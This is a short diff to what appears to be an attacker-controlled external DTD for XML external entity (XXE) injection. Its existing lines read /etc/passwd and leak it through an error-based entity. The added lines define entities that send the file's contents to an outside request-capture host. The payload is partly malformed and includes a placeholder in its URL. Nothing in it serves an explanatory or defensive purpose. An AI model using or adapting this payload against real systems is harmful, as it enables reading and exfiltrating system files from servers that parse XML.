@@ -1,4 +1,7 @@
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"
+<!ENTITY % wrapper "<!ENTITY send SYSTEM 'https://ikkang.free.beeceptor.com/?%eval;'>
+<!ENTITY send SYSTEM 'https://ikkang.free.beeceptor.com/dtd/?CONTENTS_OF_PASSWD'>
 %eval;
 %error;
+%wrapper;
